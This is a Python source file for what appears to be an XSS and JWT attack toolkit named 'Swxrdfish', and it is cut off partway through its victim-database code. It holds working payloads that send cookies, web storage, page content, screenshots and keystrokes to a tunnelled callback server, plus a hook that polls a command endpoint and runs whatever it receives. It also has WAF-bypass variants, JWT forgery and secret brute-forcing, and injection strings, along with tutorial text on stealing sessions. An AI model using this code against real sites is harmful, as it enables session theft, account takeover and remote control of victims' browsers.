import json
import base64
import urllib.parse
import sys
import os
import time
import hashlib
import hmac
import re
import socket
import threading
import requests
import sqlite3
import subprocess
import shutil
import logging
from datetime import datetime, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from collections import defaultdict
from threading import Lock

try:
    from flask import Flask, render_template_string, jsonify, request as flask_request
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from termcolor import colored
except ImportError:
    def colored(text, color=None, attrs=None):
        return text

try:
    from pyfiglet import Figlet
    FIGLET_AVAILABLE = True
except ImportError:
    FIGLET_AVAILABLE = False

try:
    import ssl
    SSL_AVAILABLE = True
except ImportError:
    SSL_AVAILABLE = False

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ConfigManager:
    """Manages configuration with file-based defaults and runtime overrides"""
    
    DEFAULT_CONFIG = {
        "server": {
            "port": 8000,
            "host": "0.0.0.0",
            "enable_https": False,
            "cert_file": "cert.pem",
            "key_file": "key.pem"
        },
        "dashboard": {
            "port": 5000,
            "host": "0.0.0.0",
            "enabled": True
        },
        "database": {
            "path": "swxrdfish_victims.db",
            "backup_enabled": True
        },
        "tunnel": {
            "preferred": "auto",
            "ngrok_path": "ngrok",
            "cloudflared_path": "cloudflared"
        },
        "webhook": {
            "url": "",
            "enabled": False
        },
        "output": {
            "directory": "swxrdfish_output",
            "log_file": "swxrdfish.log",
            "max_log_size_mb": 10
        },
        "security": {
            "rate_limit_per_ip": 100,
            "rate_limit_window_seconds": 60,
            "auto_cleanup_days": 30
        }
    }
    
    def __init__(self, config_path='config.json'):
        self.config_path = config_path
        self.config = self.load_config()
    
    def load_config(self):
        """Load configuration from file or create default"""
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, 'r') as f:
                    user_config = json.load(f)
                    config = self.DEFAULT_CONFIG.copy()
                    self._deep_update(config, user_config)
                    return config
            except Exception as e:
                logging.warning(f"Failed to load config file: {e}. Using defaults.")
                return self.DEFAULT_CONFIG.copy()
        else:
            self.save_config(self.DEFAULT_CONFIG)
            return self.DEFAULT_CONFIG.copy()
    
    def _deep_update(self, base, updates):
        """Recursively update nested dictionaries"""
        for key, value in updates.items():
            if isinstance(value, dict) and key in base and isinstance(base[key], dict):
                self._deep_update(base[key], value)
            else:
                base[key] = value
    
    def save_config(self, config=None):
        """Save configuration to file"""
        if config is None:
            config = self.config
        try:
            with open(self.config_path, 'w') as f:
                json.dump(config, f, indent=2)
        except Exception as e:
            logging.error(f"Failed to save config: {e}")
    
    def get(self, *keys, default=None):
        """Get nested config value"""
        value = self.config
        for key in keys:
            if isinstance(value, dict):
                value = value.get(key)
            else:
                return default
            if value is None:
                return default
        return value
    
    def set(self, *keys, value):
        """Set nested config value"""
        config = self.config
        for key in keys[:-1]:
            config = config.setdefault(key, {})
        config[keys[-1]] = value
        self.save_config()


class Logger:
    """Centralized logging system with file and console output"""
    
    def __init__(self, log_file='swxrdfish.log', max_size_mb=10):
        self.log_file = log_file
        self.max_size_bytes = max_size_mb * 1024 * 1024
        self.lock = Lock()
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        
        self.logger = logging.getLogger('swxrdfish')
        self._rotate_if_needed()
    
    def _rotate_if_needed(self):
        """Rotate log file if it exceeds max size"""
        try:
            if os.path.exists(self.log_file):
                if os.path.getsize(self.log_file) > self.max_size_bytes:
                    backup = f"{self.log_file}.{int(time.time())}"
                    shutil.move(self.log_file, backup)
                    self.logger.info(f"Log rotated to {backup}")
        except Exception as e:
            self.logger.error(f"Log rotation failed: {e}")
    
    def info(self, msg, color='cyan', show_console=True):
        """Log info message"""
        with self.lock:
            self.logger.info(msg)
            if show_console:
                print(colored(f"[INFO] {msg}", color))
    
    def success(self, msg, show_console=True):
        """Log success message"""
        with self.lock:
            self.logger.info(f"SUCCESS: {msg}")
            if show_console:
                print(colored(f"[+] {msg}", 'green', attrs=['bold']))
    
    def warning(self, msg, show_console=True):
        """Log warning message"""
        with self.lock:
            self.logger.warning(msg)
            if show_console:
                print(colored(f"[!] {msg}", 'yellow'))
    
    def error(self, msg, show_console=True):
        """Log error message"""
        with self.lock:
            self.logger.error(msg)
            if show_console:
                print(colored(f"[-] {msg}", 'red'))
    
    def phase(self, msg, show_console=True):
        """Log phase header"""
        with self.lock:
            self.logger.info(f"PHASE: {msg}")
            if show_console:
                print(colored(f"\n{'='*75}", 'red'))
                print(colored(f"[PHASE] {msg}", 'red', attrs=['bold']))
                print(colored(f"{'='*75}\n", 'red'))


class RateLimiter:
    """Simple rate limiter for preventing abuse"""
    
    def __init__(self, max_requests=100, window_seconds=60):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.requests = defaultdict(list)
        self.lock = Lock()
    
    def is_allowed(self, identifier):
        """Check if request from identifier is allowed"""
        with self.lock:
            now = time.time()
            cutoff = now - self.window_seconds
            
            self.requests[identifier] = [
                req_time for req_time in self.requests[identifier]
                if req_time > cutoff
            ]
            
            if len(self.requests[identifier]) >= self.max_requests:
                return False
            
            self.requests[identifier].append(now)
            return True
    
    def cleanup(self):
        """Remove old entries to prevent memory bloat"""
        with self.lock:
            now = time.time()
            cutoff = now - self.window_seconds
            
            for identifier in list(self.requests.keys()):
                self.requests[identifier] = [
                    req_time for req_time in self.requests[identifier]
                    if req_time > cutoff
                ]
                
                if not self.requests[identifier]:
                    del self.requests[identifier]


class TunnelManager:
    """Manages public tunnels for callback server"""
    
    def __init__(self, port=8000, config=None):
        self.port = port
        self.tunnel_process = None
        self.public_url = None
        self.tunnel_type = None
        self.config = config
        self.logger = logging.getLogger('swxrdfish')
    
    def start_ngrok(self):
        ngrok_path = self.config.get('tunnel', 'ngrok_path', default='ngrok') if self.config else 'ngrok'
        
        if not shutil.which(ngrok_path):
            self.logger.warning("Ngrok not found in PATH")
            return None
        
        try:
            self.tunnel_process = subprocess.Popen(
                [ngrok_path, 'http', str(self.port), '--log=stdout'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid if os.name != 'nt' else None
            )
            
            time.sleep(3)
            
            try:
                response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
                tunnels = response.json().get('tunnels', [])
                
                if tunnels:
                    for tunnel in tunnels:
                        if tunnel['proto'] == 'https':
                            self.public_url = tunnel['public_url']
                            self.tunnel_type = 'ngrok'
                            self.logger.info(f"Ngrok tunnel established: {self.public_url}")
                            return self.public_url
                    
                    self.public_url = tunnels[0]['public_url']
                    self.tunnel_type = 'ngrok'
                    self.logger.info(f"Ngrok tunnel established: {self.public_url}")
                    return self.public_url
            except Exception as e:
                self.logger.error(f"Failed to get ngrok tunnel info: {e}")
            
        except Exception as e:
            self.logger.error(f"Ngrok error: {str(e)}")
        
        return None
    
    def start_cloudflared(self):
        cloudflared_path = self.config.get('tunnel', 'cloudflared_path', default='cloudflared') if self.config else 'cloudflared'
        
        if not shutil.which(cloudflared_path):
            self.logger.warning("Cloudflared not found in PATH")
            return None
        
        try:
            self.tunnel_process = subprocess.Popen(
                [cloudflared_path, 'tunnel', '--url', f'http://localhost:{self.port}'],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                preexec_fn=os.setsid if os.name != 'nt' else None
            )
            
            time.sleep(3)
            
            for _ in range(10):
                line = self.tunnel_process.stdout.readline()
                if 'trycloudflare.com' in line:
                    match = re.search(r'https://[a-z0-9-]+\.trycloudflare\.com', line)
                    if match:
                        self.public_url = match.group(0)
                        self.tunnel_type = 'cloudflare'
                        self.logger.info(f"Cloudflare tunnel established: {self.public_url}")
                        return self.public_url
                time.sleep(0.5)
            
        except Exception as e:
            self.logger.error(f"Cloudflared error: {str(e)}")
        
        return None
    
    def start_auto(self):
        url = self.start_ngrok()
        if url:
            return url
        
        url = self.start_cloudflared()
        if url:
            return url
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = "127.0.0.1"
        
        self.public_url = f"http://{local_ip}:{self.port}"
        self.tunnel_type = 'local'
        self.logger.warning(f"No public tunnel available, using local: {self.public_url}")
        return self.public_url
    
    def stop(self):
        """Properly stop tunnel process"""
        if self.tunnel_process:
            try:
                if os.name != 'nt':
                    import signal
                    os.killpg(os.getpgid(self.tunnel_process.pid), signal.SIGTERM)
                else:
                    self.tunnel_process.terminate()
                
                self.tunnel_process.wait(timeout=5)
                self.logger.info("Tunnel process stopped")
            except Exception as e:
                self.logger.error(f"Error stopping tunnel: {e}")
                try:
                    self.tunnel_process.kill()
                except Exception:
                    pass
            finally:
                self.tunnel_process = None


class AdvancedPayloadGenerator:
    
    @staticmethod
    def basic_cookie_stealer(callback_url, campaign='default'):
        callback_url = AdvancedPayloadGenerator._sanitize_url(callback_url)
        campaign = AdvancedPayloadGenerator._sanitize_param(campaign)
        return f'<script>fetch("{callback_url}?cookies="+document.cookie+"&campaign={campaign}")</script>'
    
    @staticmethod
    def advanced_exfil(callback_url, campaign='default'):
        callback_url = AdvancedPayloadGenerator._sanitize_url(callback_url)
        campaign = AdvancedPayloadGenerator._sanitize_param(campaign)
        return f'''<script>
fetch("{callback_url}",{{
method:"POST",
headers:{{"Content-Type":"application/json"}},
body:JSON.stringify({{
cookies:document.cookie,
localStorage:Object.assign({{}},localStorage),
sessionStorage:Object.assign({{}},sessionStorage),
url:location.href,
campaign:"{campaign}"
}})
}});
</script>'''
    
    @staticmethod
    def beef_hook(callback_url, campaign='default'):
        callback_url = AdvancedPayloadGenerator._sanitize_url(callback_url)
        campaign = AdvancedPayloadGenerator._sanitize_param(campaign)
        return f'''<script>
(function(){{
let id=Math.random().toString(36).substr(2,9);
let pollInterval=5000;

function sendData(type,data){{
fetch("{callback_url}",{{
method:"POST",
headers:{{"Content-Type":"application/json"}},
body:JSON.stringify({{
type:type,
data:data,
victim_id:id,
url:location.href,
campaign:"{campaign}",
timestamp:Date.now()
}})
}});
}}

sendData("beacon",{{
cookies:document.cookie,
localStorage:Object.assign({{}},localStorage),
userAgent:navigator.userAgent,
screen:{{width:screen.width,height:screen.height}}
}});

let keyBuffer="";
document.addEventListener("keypress",(e)=>{{
keyBuffer+=e.key;
if(keyBuffer.length>50){{
sendData("keylog",keyBuffer);
keyBuffer="";
}}
}});

document.addEventListener("submit",(e)=>{{
let formData={{}};
let form=e.target;
for(let elem of form.elements){{
if(elem.name)formData[elem.name]=elem.value;
}}
sendData("form",formData);
}});

setInterval(()=>{{
fetch("{callback_url}/c2?id="+id)
.then(r=>r.json())
.then(cmd=>{{
if(cmd.command)eval(cmd.command);
}})
.catch(()=>{{}});
}},pollInterval);

}})();
</script>'''
    
    @staticmethod
    def screenshot_capture(callback_url, campaign='default'):
        callback_url = AdvancedPayloadGenerator._sanitize_url(callback_url)
        campaign = AdvancedPayloadGenerator._sanitize_param(campaign)
        return f'''<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script>
setTimeout(()=>{{
html2canvas(document.body).then(canvas=>{{
fetch("{callback_url}",{{
method:"POST",
headers:{{"Content-Type":"application/json"}},
body:JSON.stringify({{
screenshot:canvas.toDataURL(),
cookies:document.cookie,
campaign:"{campaign}"
}})
}});
}});
}},1000);
</script>'''
    
    @staticmethod
    def dom_exfil(callback_url, campaign='default'):
        callback_url = AdvancedPayloadGenerator._sanitize_url(callback_url)
        campaign = AdvancedPayloadGenerator._sanitize_param(campaign)
        return f'''<script>
fetch("{callback_url}",{{
method:"POST",
headers:{{"Content-Type":"application/json"}},
body:JSON.stringify({{
html:document.documentElement.outerHTML.slice(0,10000),
cookies:document.cookie,
campaign:"{campaign}"
}})
}});
</script>'''
    
    @staticmethod
    def multistage_loader(callback_url, campaign='default'):
        callback_url = AdvancedPayloadGenerator._sanitize_url(callback_url)
        campaign = AdvancedPayloadGenerator._sanitize_param(campaign)
        stage1 = f'<script src="{callback_url}/stage2.js?c={campaign}"></script>'
        
        stage2 = f'''
fetch("{callback_url}",{{
method:"POST",
body:JSON.stringify({{
cookies:document.cookie,
localStorage:Object.assign({{}},localStorage),
campaign:"{campaign}"
}})
}});'''
        
        return stage1, stage2
    
    @staticmethod
    def waf_bypass_payloads(callback_url, campaign='default'):
        callback_url = AdvancedPayloadGenerator._sanitize_url(callback_url)
        campaign = AdvancedPayloadGenerator._sanitize_param(campaign)
        return [
            f'<img src=x onerror="&#102;&#101;&#116;&#99;&#104;(&#39;{callback_url}&#39;)">',
            f'<script>\\u0066\\u0065\\u0074\\u0063\\u0068("{callback_url}")</script>',
            f'<ScRiPt>fetch("{callback_url}?c={campaign}")</sCrIpT>',
            f'<script><!--\nfetch("{callback_url}")\n//--></script>',
            f'<svg/onload=fetch("{callback_url}")>',
            f'<script>eval(atob("ZmV0Y2g="))(\\"{callback_url}\\")</script>',
        ]
    
    @staticmethod
    def _sanitize_url(url):
        """Basic URL sanitization"""
        if not url:
            return ""
        return url.replace('"', '\\"').replace("'", "\\'")
    
    @staticmethod
    def _sanitize_param(param):
        """Basic parameter sanitization"""
        if not param:
            return ""
        return param.replace('"', '\\"').replace("'", "\\'").replace("<", "&lt;").replace(">", "&gt;")
    
    @staticmethod
    def get_all_payloads(callback_url, campaign='default'):
        gen = AdvancedPayloadGenerator
        
        payloads = {
            'Basic Cookie Stealer': gen.basic_cookie_stealer(callback_url, campaign),
            'Advanced Exfiltration': gen.advanced_exfil(callback_url, campaign),
            'BeEF Hook Persistent': gen.beef_hook(callback_url, campaign),
            'Screenshot Capture': gen.screenshot_capture(callback_url, campaign),
            'DOM Exfiltration': gen.dom_exfil(callback_url, campaign),
            'Multi-stage Loader': gen.multistage_loader(callback_url, campaign)[0],
            'WAF Bypass HTML Encode': gen.waf_bypass_payloads(callback_url, campaign)[0],
            'WAF Bypass Unicode': gen.waf_bypass_payloads(callback_url, campaign)[1],
            'WAF Bypass SVG': gen.waf_bypass_payloads(callback_url, campaign)[4],
        }
        
        return payloads


class TutorialSystem:
    
    @staticmethod
    def explain(topic, level="beginner"):
        explanations = {
            "xss": {
                "beginner": """
What is XSS (Cross-Site Scripting)?
------------------------------------

XSS is when you inject JavaScript code into a website that runs in other people's browsers.

Simple example:
If a website has a comment section and you post:
<script>alert('Hello')</script>

When someone views your comment, their browser executes YOUR code.

Why this matters:
- Steal their login cookies and session tokens
- Capture keystrokes (passwords, credit cards)
- Take screenshots of their screen
- Perform actions as them (change password, send messages)

The attack flow:
1. Find a website that doesn't sanitize user input
2. Inject malicious JavaScript code
3. Victim visits the page containing your code
4. Their browser executes your code
5. You receive their cookies and tokens
6. Now you can impersonate them

What Swxrdfish does:
- Creates a public server to receive stolen data
- Generates elite payloads (BeEF hooks, keyloggers, screenshots)
- Stores all victim information in a database
- Provides a web dashboard to view everything
""",
                "normal": "XSS allows injecting JavaScript into web pages to steal user data"
            },
            
            "callback_server": {
                "beginner": """
What is a Callback Server?
--------------------------

A callback server is where stolen data gets sent.

How it works:
1. You set up a public server (Swxrdfish does this automatically)
2. Your server gets a public URL (like https://abc123.ngrok.io)
3. Your XSS payload sends victim data to your public server
4. You collect and analyze the stolen information

The flow:
Victim's Browser --sends data--> Public Callback Server --stores--> Database

Example payload:
<script>
  fetch('https://abc123.ngrok.io?cookies=' + document.cookie)
</script>

What Swxrdfish collects:
- Cookies and session tokens
- JWT tokens
- localStorage items
- sessionStorage items
- IP address and browser info
- Keystrokes (with BeEF hook)
- Screenshots

Public vs Local:
- Local (http://192.168.1.5:8000) only works on your network
- Public (https://abc123.ngrok.io) works from anywhere on internet

Swxrdfish automatically creates public URLs for real bug bounty work.
""",
                "normal": "Server that receives data from XSS payloads"
            },
            
            "jwt": {
                "beginner": """
What are JWT Tokens?
-------------------

JWT (JSON Web Token) is like an ID badge that websites use instead of cookies.

Structure:
A JWT has 3 parts separated by dots:

xxxxx.yyyyy.zzzzz
  ^     ^     ^
  |     |     +-- Signature (proves it's legit)
  |     +-------- Payload (your user info)
  +-------------- Header (token type)

Example:
eyJhbGci.eyJ1c2VyIjoiam9obiIsImFkbWluIjpmYWxzZX0.abc123

The middle part decodes to:
{"user":"john", "admin":false}

The attack:
What if we change "admin":false to "admin":true?
If the signature is weak, we can forge a new token and become admin.

What Swxrdfish tests:
1. None algorithm - No signature needed
2. Weak secret - Cracks the secret and forges tokens
3. Algorithm confusion - Tricks server verification
4. Expired tokens - Tests if old tokens still work
5. Privilege escalation - Auto-generates admin tokens
""",
                "normal": "JWTs are authentication tokens that can be exploited if misconfigured"
            }
        }
        
        return explanations.get(topic, {}).get(level, "No explanation available")
    
    @staticmethod
    def pause_for_user(prompt="Press Enter when ready to continue..."):
        print()
        input(colored(f"[*] {prompt}", 'cyan', attrs=['bold']))
        print()
    
    @staticmethod
    def show_tip(tip):
        print(colored(f"\nTIP: {tip}\n", 'yellow', attrs=['bold']))
    
    @staticmethod
    def show_step(step_num, total_steps, description):
        print(colored(f"\n{'='*75}", 'green'))
        print(colored(f"  STEP {step_num}/{total_steps}: {description}", 'green', attrs=['bold']))
        print(colored(f"{'='*75}\n", 'green'))


class AdvancedJWTExploiter:
    
    def __init__(self):
        self.common_secrets = [
            'secret', 'key', 'password', '123456', 'admin', 'jwt_secret',
            'secret123', 'secretkey', 'your-secret', 'your_secret_key',
            'jwt-secret', 'api_secret', 'token_secret', 'auth_secret',
            'mysecret', 'jwt', 'default', 'test', 'example', 'demo'
        ]
        self.logger = logging.getLogger('swxrdfish')
    
    def analyze_comprehensive(self, token):
        try:
            if not token or not isinstance(token, str):
                return {'error': 'Invalid token format'}
            
            parts = token.split('.')
            if len(parts) != 3:
                return {'error': 'Invalid JWT format - must have 3 parts'}
            
            header = self._decode_part(parts[0])
            payload = self._decode_part(parts[1])
            signature = parts[2]
            
            results = {
                'header': header,
                'payload': payload,
                'algorithm': header.get('alg', 'unknown'),
                'vulnerabilities': [],
                'exploitation_vectors': [],
                'forged_tokens': {}
            }
            
            none_token = self._test_none_algorithm(parts[0], parts[1])
            if none_token:
                results['vulnerabilities'].append('CRITICAL: Accepts "none" algorithm')
                results['forged_tokens']['none_algorithm'] = none_token
                results['exploitation_vectors'].append({
                    'name': 'None Algorithm Bypass',
                    'severity': 'CRITICAL',
                    'poc': f'Use token: {none_token}'
                })
            
            if header.get('alg') == 'RS256':
                results['vulnerabilities'].append('RS256: Vulnerable to algorithm confusion')
                results['exploitation_vectors'].append({
                    'name': 'Algorithm Confusion (RS256->HS256)',
                    'severity': 'CRITICAL',
                    'description': 'Change alg to HS256, sign with public key as secret'
                })
            
            if header.get('alg') in ['HS256', 'HS384', 'HS512']:
                weak_secret = self._bruteforce_secret(parts[0], parts[1], signature, header.get('alg'))
                if weak_secret:
                    results['vulnerabilities'].append(f'CRITICAL: Weak secret found: {weak_secret}')
                    escalated = self._escalate_privileges(parts[0], parts[1], weak_secret, header.get('alg'))
                    if escalated:
                        results['forged_tokens']['privilege_escalation'] = escalated
                        results['exploitation_vectors'].append({
                            'name': 'Weak Secret + Privilege Escalation',
                            'severity': 'CRITICAL',
                            'secret': weak_secret,
                            'poc': f'Forged admin token: {escalated}'
                        })
            
            if 'jku' in header or 'jwk' in header:
                results['vulnerabilities'].append('JKU/JWK header present - injection possible')
                results['exploitation_vectors'].append({
                    'name': 'JKU/JWK Header Injection',
                    'severity': 'HIGH',
                    'description': 'Point jku to attacker-controlled server with malicious key'
                })
            
            if 'kid' in header:
                results['vulnerabilities'].append('KID header present - SQL injection vector')
                kid_payloads = self._generate_kid_exploits()
                results['exploitation_vectors'].append({
                    'name': 'KID SQL Injection',
                    'severity': 'HIGH',
                    'payloads': kid_payloads
                })
            
            if 'exp' in payload:
                try:
                    exp_time = datetime.fromtimestamp(payload['exp'])
                    if exp_time < datetime.now():
                        results['vulnerabilities'].append('Token is expired but may still be accepted')
                except Exception:
                    pass
            else:
                results['vulnerabilities'].append('No expiration - token never expires')
            
            claim_vectors = self._find_claim_exploits(payload)
            results['exploitation_vectors'].extend(claim_vectors)
            
            exploit_tokens = self._generate_all_exploits(header, payload, signature)
            results['forged_tokens'].update(exploit_tokens)
            
            return results
            
        except Exception as e:
            self.logger.error(f"JWT analysis failed: {e}")
            return {'error': f'Analysis failed: {str(e)}'}
    
    def _decode_part(self, part):
        try:
            padding = 4 - (len(part) % 4)
            if padding != 4:
                part += '=' * padding
            decoded = base64.urlsafe_b64decode(part)
            return json.loads(decoded)
        except Exception as e:
            self.logger.error(f"Failed to decode JWT part: {e}")
            raise
    
    def _encode_part(self, data):
        try:
            return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
        except Exception as e:
            self.logger.error(f"Failed to encode JWT part: {e}")
            raise
    
    def _test_none_algorithm(self, header_part, payload_part):
        try:
            header = self._decode_part(header_part)
            header['alg'] = 'none'
            new_header = self._encode_part(header)
            return f"{new_header}.{payload_part}."
        except Exception as e:
            self.logger.error(f"None algorithm test failed: {e}")
            return None
    
    def _bruteforce_secret(self, header_part, payload_part, signature, algorithm):
        try:
            unsigned = f"{header_part}.{payload_part}"
            
            for secret in self.common_secrets:
                if algorithm == 'HS256':
                    test_sig = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), unsigned.encode(), hashlib.sha256).digest()
                    ).decode().rstrip('=')
                elif algorithm == 'HS384':
                    test_sig = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), unsigned.encode(), hashlib.sha384).digest()
                    ).decode().rstrip('=')
                elif algorithm == 'HS512':
                    test_sig = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), unsigned.encode(), hashlib.sha512).digest()
                    ).decode().rstrip('=')
                else:
                    continue
                
                if test_sig == signature:
                    return secret
            
            return None
        except Exception as e:
            self.logger.error(f"Secret bruteforce failed: {e}")
            return None
    
    def _escalate_privileges(self, header_part, payload_part, secret, algorithm):
        try:
            header = self._decode_part(header_part)
            payload = self._decode_part(payload_part)
            
            payload['admin'] = True
            payload['role'] = 'admin'
            
            if 'exp' in payload:
                payload['exp'] = int((datetime.now() + timedelta(days=365)).timestamp())
            
            new_header = self._encode_part(header)
            new_payload = self._encode_part(payload)
            unsigned = f"{new_header}.{new_payload}"
            
            if algorithm == 'HS256':
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), unsigned.encode(), hashlib.sha256).digest()
                ).decode().rstrip('=')
            elif algorithm == 'HS384':
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), unsigned.encode(), hashlib.sha384).digest()
                ).decode().rstrip('=')
            else:
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), unsigned.encode(), hashlib.sha512).digest()
                ).decode().rstrip('=')
            
            return f"{unsigned}.{sig}"
        except Exception as e:
            self.logger.error(f"Privilege escalation failed: {e}")
            return None
    
    def _generate_kid_exploits(self):
        return [
            "../../dev/null",
            "/dev/null",
            "' OR '1'='1",
            "admin' --",
            "' UNION SELECT 'secret",
            "../../../etc/passwd",
            "$(whoami)",
            "; sleep 5; #"
        ]
    
    def _find_claim_exploits(self, payload):
        vectors = []
        
        if 'user_id' in payload or 'uid' in payload or 'sub' in payload:
            vectors.append({
                'name': 'User ID Manipulation (IDOR)',
                'severity': 'HIGH',
                'description': 'Change user_id to access other accounts'
            })
        
        if 'role' in payload:
            vectors.append({
                'name': 'Role Escalation',
                'severity': 'CRITICAL',
                'description': f'Current role: {payload["role"]}'
            })
        
        return vectors
    
    def _generate_all_exploits(self, header, payload, signature):
        exploits = {}
        
        try:
            h = self._encode_part(header)
            p = self._encode_part(payload)
            exploits['empty_signature'] = f"{h}.{p}."
        except Exception as e:
            self.logger.error(f"Failed to generate empty signature token: {e}")
        
        return exploits


class VictimDatabase:
    """Thread-safe victim database with proper locking"""
    
    def __init__(self, db_path='swxrdfish_victims.db'):
        self.db_path = db_path
        self.lock = Lock()
        self.logger = logging.getLogger('swxrdfish')
        self.init_database()
    
    def _get_connection(self):
        """Get a new connection for each thread"""
        return sqlite3.connect(self.db_path, timeout=30.0)
    
    def init_database(self):
        """Initialize database with proper schema"""
        with self.lock:
            try:
                conn = self._get_connection()
                cursor = conn.cursor()
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS victims (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        timestamp TEXT NOT NULL,
                        ip_address TEXT NOT NULL,
                        user_agent TEXT,
                        url TEXT,
                        referrer TEXT,
                        campaign_id TEXT,
                        screenshot_path TEXT,
                        fingerprint TEXT
                    )
                ''')
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS tokens (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        victim_id INTEGER,
                        token_type TEXT,
                        token_name TEXT,
                        token_value TEXT,
                        FOREIGN KEY (victim_id) REFERENCES victims(id)
                    )
                ''')
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS storage_data (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        victim_id INTEGER,
                        storage_type TEXT,
                        key TEXT,
                        value TEXT,
                        FOREIGN KEY (victim_id) REFERENCES victims(id)
                    )
                ''')
                
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_victims_timestamp ON victims(timestamp)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_victims_campaign ON victims(campaign_id)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_tokens_victim ON tokens(victim_id)')
                
                conn.commit()
                conn.close()
                self.logger.info("Database initialized successfully")
            except Exception as e:
                self.logger.error(f"Database initialization failed: {e}")
                raise
    
    def add_victim(self, data):
        """Add victim with thread-safe operations"""
        with self.lock:
            conn = None
            try:
                conn = self._get_connection()
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT INTO victims (timestamp, ip_address, user_agent, url, campaign_id, fingerprint)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    data.get('timestamp', datetime.now().isoformat()),
                    data.get('ip', 'Unknown'),
                    data.get('user_agent', 'Unknown'),
                    data.get('url', ''),
                    data.get('campaign_id', 'default'),
                    json.dumps(data.get('fingerprint', {}))
                ))
                
                victim_id = cursor.lastrowid
                
                cookies = data.get('cookies', {})
                if isinstance(cookies, str):
                    for cookie in cookies.split(';'):
                        if '=' in cookie:
                            parts = cookie.strip().split('=', 1)
                            if len(parts) == 2:
                                name, value = parts
                                cursor.execute('''
                                    INSERT INTO tokens (victim_id, token_type, token_name, token_value)
                                    VALUES (?, ?, ?, ?)
                                ''', (victim_id, 'cookie', name, value))
                
                local_storage = data.get('localStorage', {})
                if isinstance(local_storage, dict):
                    for key, value in local_storage.items():
                        cursor.execute('''
                            INSERT INTO storage_data (victim_id, storage_type, key, value)
                            VALUES (?, ?, ?, ?)
                        ''', (victim_id, 'localStorage', key, str(value)))
                
                session_storage = data.get('sessionStorage', {})
                if isinstance(session_storage, dict):
                    for key, value in session_storage.items():
                        cursor.execute('''
                            INSERT INTO storage_data (victim_id, storage_type, key, value)
                            VALUES (?, ?, ?, ?)
                        ''', (victim_id, 'sessionStorage', key, str(value)))
                
                token_types = ['jwt', 'token', 'auth_token', 'bearer', 'session_token', 
                              'api_key', 'access_token', 'refresh_token', 'csrf_token']
                for token_type in token_types:
                    if token_type in data and data[token_type]:
                        cursor.execute('''
                            INSERT INTO tokens (victim_id, token_type, token_name, token_value)
                            VALUES (?, ?, ?, ?)
                        ''', (victim_id, token_type, token_type, str(data[token_type])))
                
                conn.commit()
                conn.close()
                self.logger.info(f"Victim #{victim_id} added to database")
                return victim_id
            except Exception as e:
                self.logger.error(f"Failed to add victim: {e}")
                if conn:
                    conn.close()
                return None
    
    def get_all_victims(self):
        """Get all victims with thread safety"""
        with self.lock:
            conn = None
            try:
                conn = self._get_connection()
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT v.id, v.timestamp, v.ip_address, v.user_agent, v.campaign_id,
                           COUNT(DISTINCT t.id) as token_count
                    FROM victims v
                    LEFT JOIN tokens t ON v.id = t.victim_id
                    GROUP BY v.id
                    ORDER BY v.timestamp DESC
                ''')
                
                victims = []
                for row in cursor.fetchall():
                    victims.append({
                        'id': row[0],
                        'timestamp': row[1],
                        'ip': row[2],
                        'user_agent': row[3],
                        'campaign': row[4],
                        'token_count': row[5]
                    })
                
                conn.close()
                return victims
            except Exception as e:
                self.logger.error(f"Failed to get victims: {e}")
                if conn:
                    conn.close()
                return []
    
    def get_victim_tokens(self, victim_id):
        """Get tokens for specific victim"""
        with self.lock:
            conn = None
            try:
                conn = self._get_connection()
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT token_type, token_name, token_value
                    FROM tokens
                    WHERE victim_id = ?
                ''', (victim_id,))
                
                tokens = []
                for row in cursor.fetchall():
                    tokens.append({
                        'type': row[0],
                        'name': row[1],
                        'value': row[2]
                    })
                
                conn.close()
                return tokens
            except Exception as e:
                self.logger.error(f"Failed to get victim tokens: {e}")
                if conn:
                    conn.close()
                return []
    
    def get_victim_storage(self, victim_id):
        """Get storage data for specific victim"""
        with self.lock:
            conn = None
            try:
                conn = self._get_connection()
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT storage_type, key, value
                    FROM storage_data
                    WHERE victim_id = ?
                ''', (victim_id,))
                
                storage = {'localStorage': {}, 'sessionStorage': {}}
                for row in cursor.fetchall():
                    storage_type = row[0]
                    key = row[1]
                    value = row[2]
                    if storage_type in storage:
